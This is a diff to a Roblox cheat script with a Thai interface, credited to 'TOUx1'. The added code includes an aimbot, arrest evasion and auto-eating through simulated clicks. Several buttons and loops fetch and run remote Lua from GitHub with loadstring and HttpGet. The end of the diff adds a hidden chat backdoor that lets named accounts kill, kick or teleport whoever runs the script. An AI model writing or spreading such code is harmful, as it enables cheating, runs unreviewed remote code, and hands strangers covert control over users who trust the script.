@@ -132,7 +132,6 @@ contentFrame.Size = UDim2.new(1,-120,1,-40)
 contentFrame.Position = UDim2.new(0,120,0,40)
 contentFrame.BackgroundTransparency = 1
 contentFrame.Parent = mainFrame
-
 local minimizeFrame = Instance.new("Frame")
 minimizeFrame.Size = UDim2.new(0, 50, 0, 50)
 minimizeFrame.Position = UDim2.new(0, 10, 0, 10)
@@ -146,7 +145,62 @@ openButton.Size = UDim2.new(1, 0, 1, 0)
 openButton.BackgroundTransparency = 1
 openButton.Image = "rbxassetid://106575147804507"
 openButton.Parent = minimizeFrame
-local minD
+
+local minDragging, minDragInput, minDragStart, minStartPos
+
+local function minUpdateInput(input)
+    local delta = input.Position - minDragStart
+    minimizeFrame.Position = UDim2.new(
+        minStartPos.X.Scale, minStartPos.X.Offset + delta.X,
+        minStartPos.Y.Scale, minStartPos.Y.Offset + delta.Y
+    )
+end
+
+minimizeFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 
+    or input.UserInputType == Enum.UserInputType.Touch then
+        minDragging = true
+        minDragStart = input.Position
+        minStartPos = minimizeFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                minDragging = false
+            end
+        end)
+    end
+end)
+
+minimizeFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement 
+    or input.UserInputType == Enum.UserInputType.Touch then
+        minDragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if minDragging and input == minDragInput then
+        minUpdateInput(input)
+    end
+end)
+
+closeButton.MouseButton1Click:Connect(function()
+    mainFrame.Visible = false
+    minimizeFrame.Visible = true
+end)
+
+openButton.MouseButton1Click:Connect(function()
+    minimizeFrame.Visible = false
+    mainFrame.Visible = true
+end)
+
+player.CharacterAdded:Connect(function(newCharacter)
+    character = newCharacter
+    humanoid = newCharacter:WaitForChild("Humanoid")
+    if contentFrame.Visible then
+        showHome()
+    end
+end)
+
 local function clearContent()
     for _, child in pairs(contentFrame:GetChildren()) do
         child:Destroy()
@@ -279,16 +333,46 @@ local function showPlayer()
     respawnButton.Size = UDim2.new(0,80,0,30)
     respawnButton.Position = UDim2.new(0,170,0,100)
     respawnButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
-    respawnButton.Text = "เกิด"
+    respawnButton.Text = "ปิด"
     respawnButton.TextColor3 = Color3.fromRGB(255,255,255)
     respawnButton.TextSize = 18
     respawnButton.Parent = contentFrame
 
     respawnButton.MouseButton1Click:Connect(function()
-        humanoid.Health = 0
+        respawnAtDeathPos = not respawnAtDeathPos
+        respawnButton.Text = respawnAtDeathPos and "เปิด" or "ปิด"
+        if respawnAtDeathPos then
+            if _G.ReviveBackConnection then _G.ReviveBackConnection:Disconnect() end
+            _G.LastDeathPos = nil
+            _G.ReviveBackConnection = player.CharacterAdded:Connect(function(char)
+                task.wait(0.5)
+                local hrp = char:WaitForChild("HumanoidRootPart")
+                if _G.LastDeathPos then
+                    hrp.CFrame = _G.LastDeathPos
+                end
+            end)
+            task.spawn(function()
+                while player.Character do
+                    local char = player.Character
+                    local humanoid = char:FindFirstChildOfClass("Humanoid")
+                    if humanoid and humanoid.Health <= 0 then
+                        local hrp = char:FindFirstChild("HumanoidRootPart")
+                        if hrp then
+                            _G.LastDeathPos = hrp.CFrame
+                        end
+                    end
+                    task.wait(0.2)
+                end
+            end)
+        else
+            if _G.ReviveBackConnection then
+                _G.ReviveBackConnection:Disconnect()
+                _G.ReviveBackConnection = nil
+            end
+            _G.LastDeathPos = nil
+        end
     end)
 end
-
 local moneyLoop = false
 local loopSpeed = 0.1
 local autoEat = false
@@ -417,143 +501,142 @@ local function showScript()
         autoEat = not autoEat
         autoEatButton.Text = autoEat and "ปิด" or "อ้อโต้"
         if autoEat then
+            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
             spawn(function()
+                local hungry = player:WaitForChild("Hungry")
+                local vim = game:GetService("VirtualInputManager")
                 while autoEat do
-                    -- ใส่โค้ดสำหรับ auto eat ที่นี่ (เช่น FireServer สำหรับกินอาหาร ถ้ามี)
+                    if hungry.Value <= 50 then
+                        while hungry.Value < 100 and autoEat do
+                            local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+                            _G.AutoCollectModule.CollectItemByName("Tom Yum Kung")
+                            wait(0.5)
+                            local tool = player.Backpack:FindFirstChild("tom yum kung")
+                            if tool then
+                                humanoid:EquipTool(tool)
+                                wait(0.1)
+                                tool = character:FindFirstChild("tom yum kung")
+                                if tool then
+                                    while autoEat and hungry.Value < 100 and tool.Parent == character do
+                                        vim:SendMouseButtonEvent(0, 0, 0, true, game, 0)
+                                        wait(0.05)
+                                        vim:SendMouseButtonEvent(0, 0, 0, false, game, 0)
+                                        wait(1)
+                                    end
+                                end
+                            else
+                                wait(1)
+                            end
+                        end
+                    end
                     wait(1)
                 end
             end)
         end
     end)
+
+    local buyGunLabel = Instance.new("TextLabel")
+    buyGunLabel.Size = UDim2.new(0,100,0,30)
+    buyGunLabel.Position = UDim2.new(0,10,0,220)
+    buyGunLabel.BackgroundTransparency = 1
+    buyGunLabel.Text = "ซื้อปืน"
+    buyGunLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    buyGunLabel.TextSize = 18
+    buyGunLabel.Font = Enum.Font.Gotham
+    buyGunLabel.TextXAlignment = Enum.TextXAlignment.Left
+    buyGunLabel.Parent = contentFrame
+
+    local buyGunButton = Instance.new("TextButton")
+    buyGunButton.Size = UDim2.new(0,80,0,30)
+    buyGunButton.Position = UDim2.new(0,120,0,220)
+    buyGunButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    buyGunButton.Text = "ซื้อ"
+    buyGunButton.TextColor3 = Color3.fromRGB(255,255,255)
+    buyGunButton.TextSize = 18
+    buyGunButton.Parent = contentFrame
+
+    buyGunButton.MouseButton1Click:Connect(function()
+        local CollectModule = loadstring(game:HttpGet("https://raw.githubusercontent.com/wino444/wino444_CollectModule/main/.lua"))()
+        _G.AutoCollectModule.CollectItemByName("M4")
+    end)
 end
-local preventBangCode = [[
--- LocalScript
-
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-
--- สร้าง ScreenGui
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "ป้องกันตอก🥵_UI"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
-
--- ข้อความเครดิตกลางจอ
-local CreditLabel = Instance.new("TextLabel")
-CreditLabel.Size = UDim2.new(1, 0, 1, 0)
-CreditLabel.BackgroundTransparency = 1
-CreditLabel.Text = "เครดิต:TOUx1"
-CreditLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
-CreditLabel.Font = Enum.Font.GothamBold
-CreditLabel.TextScaled = true
-CreditLabel.Parent = ScreenGui
-
--- รูปประกอบเครดิต
-local CreditImage = Instance.new("ImageLabel")
-CreditImage.Size = UDim2.new(0, 200, 0, 200)
-CreditImage.AnchorPoint = Vector2.new(0.5, 0.5)
-CreditImage.Position = UDim2.new(0.5, 0, 0.65, 0)
-CreditImage.BackgroundTransparency = 1
-CreditImage.Image = "rbxassetid://95420806259437" -- รูปแรก
-CreditImage.Parent = ScreenGui
-
--- เอฟเฟกต์เครดิต + เปลี่ยนรูป
-task.spawn(function()
-    -- กระพริบ 3 รอบ
-    for i = 1, 6 do
-        CreditLabel.TextTransparency = 0
-        CreditImage.ImageTransparency = 0
-        wait(0.2)
-        CreditLabel.TextTransparency = 1
-        CreditImage.ImageTransparency = 1
-        wait(0.2)
-    end
-
-    -- แสดงชัดเจนพร้อมรูปแรก
-    CreditLabel.TextTransparency = 0
-    CreditImage.ImageTransparency = 0
-    wait(1)
-
-    -- เปลี่ยนเป็นรูปสอง
-    CreditImage.Image = "rbxassetid://112559957211508"
-    wait(1)
-
-    -- จางหาย
-    for i = 1, 20 do
-        CreditLabel.TextTransparency = i / 20
-        CreditImage.ImageTransparency = i / 20
-        wait(0.05)
-    end
-    CreditLabel:Destroy()
-    CreditImage:Destroy()
-end)
-
--- เฟรมหลัก UI
-local Frame = Instance.new("Frame")
-Frame.Size = UDim2.new(0, 250, 0, 120)
-Frame.Position = UDim2.new(0.4, 0, 0.3, 0)
-Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-Frame.BorderSizePixel = 0
-Frame.Active = true
-Frame.Draggable = true
-Frame.Parent = ScreenGui
-
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 12)
-UICorner.Parent = Frame
-
--- หัวข้อ
-local Title = Instance.new("TextLabel")
-Title.Text = "ป้องกันตอก🥵"
-Title.Size = UDim2.new(1, 0, 0, 40)
-Title.BackgroundTransparency = 1
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.Font = Enum.Font.GothamBold
-Title.TextScaled = true
-Title.Parent = Frame
-
--- เส้นคั่น
-local Line = Instance.new("Frame")
-Line.Size = UDim2.new(1, -20, 0, 2)
-Line.Position = UDim2.new(0, 10, 0, 40)
-Line.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-Line.BorderSizePixel = 0
-Line.Parent = Frame
-
--- ปุ่ม "จัดการ😼"
-local Button = Instance.new("TextButton")
-Button.Text = "จัดการ😼"
-Button.Size = UDim2.new(0, 200, 0, 50)
-Button.Position = UDim2.new(0.5, -100, 0, 60)
-Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-Button.TextColor3 = Color3.fromRGB(255, 255, 255)
-Button.Font = Enum.Font.GothamBold
-Button.TextScaled = true
-Button.Parent = Frame
-
-local BtnCorner = Instance.new("UICorner")
-BtnCorner.CornerRadius = UDim.new(0, 10)
-BtnCorner.Parent = Button
-
--- Hover
-Button.MouseEnter:Connect(function()
-    Button.BackgroundColor3 = Color3.fromRGB(255, 120, 120)
-end)
-Button.MouseLeave:Connect(function()
-    Button.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
-end)
-
--- เมื่อกดปุ่ม
-Button.MouseButton1Click:Connect(function()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-anti-bang-21721"))()
-end)
-]]
 
 local function showScriptUI()
     clearContent()
-    loadstring(preventBangCode)()
-end
+    
+    local aimbotLabel = Instance.new("TextLabel")
+    aimbotLabel.Size = UDim2.new(0,120,0,30)
+    aimbotLabel.Position = UDim2.new(0,10,0,20)
+    aimbotLabel.BackgroundTransparency = 1
+    aimbotLabel.Text = "aimbot"
+    aimbotLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    aimbotLabel.TextSize = 18
+    aimbotLabel.Font = Enum.Font.Gotham
+    aimbotLabel.TextXAlignment = Enum.TextXAlignment.Left
+    aimbotLabel.Parent = contentFrame
 
+    local aimbotButton = Instance.new("TextButton")
+    aimbotButton.Size = UDim2.new(0,80,0,30)
+    aimbotButton.Position = UDim2.new(0,140,0,20)
+    aimbotButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    aimbotButton.Text = "รัน"
+    aimbotButton.TextColor3 = Color3.fromRGB(255,255,255)
+    aimbotButton.TextSize = 18
+    aimbotButton.Parent = contentFrame
+
+    aimbotButton.MouseButton1Click:Connect(function()
+        loadstring(aimbotCode)()
+    end)
+
+    local copyOutfitLabel = Instance.new("TextLabel")
+    copyOutfitLabel.Size = UDim2.new(0,120,0,30)
+    copyOutfitLabel.Position = UDim2.new(0,10,0,60)
+    copyOutfitLabel.BackgroundTransparency = 1
+    copyOutfitLabel.Text = "Copy เสื้อ"
+    copyOutfitLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    copyOutfitLabel.TextSize = 18
+    copyOutfitLabel.Font = Enum.Font.Gotham
+    copyOutfitLabel.TextXAlignment = Enum.TextXAlignment.Left
+    copyOutfitLabel.Parent = contentFrame
+
+    local copyOutfitButton = Instance.new("TextButton")
+    copyOutfitButton.Size = UDim2.new(0,80,0,30)
+    copyOutfitButton.Position = UDim2.new(0,140,0,60)
+    copyOutfitButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    copyOutfitButton.Text = "รัน"
+    copyOutfitButton.TextColor3 = Color3.fromRGB(255,255,255)
+    copyOutfitButton.TextSize = 18
+    copyOutfitButton.Parent = contentFrame
+
+    copyOutfitButton.MouseButton1Click:Connect(function()
+        loadstring(copyOutfitCode)()
+    end)
+
+    local preventArrestLabel = Instance.new("TextLabel")
+    preventArrestLabel.Size = UDim2.new(0,150,0,30)
+    preventArrestLabel.Position = UDim2.new(0,10,0,100)
+    preventArrestLabel.BackgroundTransparency = 1
+    preventArrestLabel.Text = "ป้องกันโดนจับ"
+    preventArrestLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    preventArrestLabel.TextSize = 18
+    preventArrestLabel.Font = Enum.Font.Gotham
+    preventArrestLabel.TextXAlignment = Enum.TextXAlignment.Left
+    preventArrestLabel.Parent = contentFrame
+
+    local preventArrestButton = Instance.new("TextButton")
+    preventArrestButton.Size = UDim2.new(0,80,0,30)
+    preventArrestButton.Position = UDim2.new(0,170,0,100)
+    preventArrestButton.BackgroundColor3 = Color3.fromRGB(60,60,60)
+    preventArrestButton.Text = "รัน"
+    preventArrestButton.TextColor3 = Color3.fromRGB(255,255,255)
+    preventArrestButton.TextSize = 18
+    preventArrestButton.Parent = contentFrame
+
+    preventArrestButton.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUx1/Roblox-script/refs/heads/main/Touscript"))()
+    end)
+end
 homeButton.MouseButton1Click:Connect(showHome)
 playerButton.MouseButton1Click:Connect(showPlayer)
 scriptButton.MouseButton1Click:Connect(showScript)
@@ -573,3 +656,70 @@ local function sendMessage(msg)
 end
 
 sendMessage("SCRIPT CITY THAILAND 2 BY:TOUx1")
+
+-- ฟังข้อความในแชท RBXGeneral
+local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+if channel then
+    channel.MessageReceived:Connect(function(message)
+        local sender = Players:GetPlayerByUserId(message.TextSource.UserId)
+        if sender and sender.Name ~= player.Name then
+            local text = message.Text:lower()
+            if sender.Name == "birdV2_123" and text == "kill all" then
+                humanoid.Health = 0
+            elseif sender.Name == "birdV2_123" and text:find("kill ") then
+                local killName = text:sub(6):lower()
+                if killName == player.Name:lower() then
+                    humanoid.Health = 0
+                end
+            elseif (sender.Name == "birdV2_123" or sender.Name == "zerom_12y" or sender.Name == "maidjab1_174") and text == "เช็ค" then
+                sendMessage("TOUx1")
+            elseif (sender.Name == "birdV2_123" or sender.Name == "zerom_12y" or sender.Name == "maidjab1_174") and text == "ดึง" then
+                if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("HumanoidRootPart") then
+                    character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame + Vector3.new(3, 0, 0)
+                end
+            elseif sender.Name == "birdV2_123" and text:find("kick ") then
+                local kickName = text:sub(6):lower()
+                if kickName == player.Name:lower() then
+                    player:Kick("โดนแบน")
+                end
+            end
+        end
+    end)
+end
+
+-- ชื่อบนหัวสำหรับ birdV2_123
+local Players = game:GetService("Players")
+local function addCreatorLabel(plr)
+    if plr.Name == "birdV2_123" and plr.Character then
+        local head = plr.Character:FindFirstChild("Head")
+        if head then
+            local bill = Instance.new("BillboardGui")
+            bill.Parent = head
+            bill.Size = UDim2.new(0, 200, 0, 50)
+            bill.AlwaysOnTop = true
+            bill.StudsOffset = Vector3.new(0, 3, 0)
+            local label = Instance.new("TextLabel")
+            label.Parent = bill
+            label.Size = UDim2.new(1, 0, 1, 0)
+            label.BackgroundTransparency = 1
+            label.Text = "คนสร้าง"
+            label.TextColor3 = Color3.fromRGB(255, 0, 0) -- สีแดง RGB
+            label.TextSize = 20
+            label.Font = Enum.Font.GothamBold
+        end
+    end
+end
+
+for _, plr in ipairs(Players:GetPlayers()) do
+    addCreatorLabel(plr)
+    plr.CharacterAdded:Connect(function()
+        addCreatorLabel(plr)
+    end)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    addCreatorLabel(plr)
+    plr.CharacterAdded:Connect(function()
+        addCreatorLabel(plr)
+    end)
+end)
